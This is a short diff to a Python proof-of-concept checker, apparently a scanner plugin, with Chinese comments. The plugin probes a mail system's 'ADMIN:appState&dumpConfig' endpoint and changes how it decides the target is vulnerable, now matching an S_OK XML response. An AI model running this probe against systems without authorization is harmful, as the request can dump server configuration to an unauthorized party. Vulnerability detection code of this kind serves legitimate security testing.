@@ -44,7 +44,7 @@ class POC(POCBase):
         vuln = [False,""]
         url = self.target + "/mailsms/s?func=ADMIN:appState&dumpConfig=/" # url自己按需调整
         
-
+        key = """<?xml version="1.0" encoding="UTF-8"?>\n<result>\n<code>S_OK</code>"""
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
                     # "Content-Type": "application/x-www-form-urlencoded",
@@ -55,7 +55,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and "<code>FS_IP_NOT_PERMITTED</code>" not in req.text:#req.status_code == 200 and :
+            if req.status_code == 200 and key in req.text:#req.status_code == 200 and :
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
